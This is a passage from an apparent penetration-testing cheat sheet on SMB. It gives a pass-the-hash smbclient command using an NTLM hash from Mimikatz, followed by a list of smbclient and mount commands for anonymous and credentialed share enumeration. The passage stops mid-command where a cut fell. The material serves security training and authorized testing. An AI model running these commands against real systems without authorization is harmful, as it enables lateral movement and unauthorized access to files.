*connect with an ntlm hash from mimikats
```c
smbclient \\\\192.168.250.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

#### smbclient

```c
smbclient -L \\<RHOST>\ -N
smbclient -L //<RHOST>/ -N
smbclient -L ////<RHOST>/ -N
smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
smbclient "\\\\<RHOST>\<SHARE>"
smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
smbclient --no-pass //<RHOST>/<SHARE>
mount.cifs //<RHOST>/<SHARE> /mnt/remote
guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<
```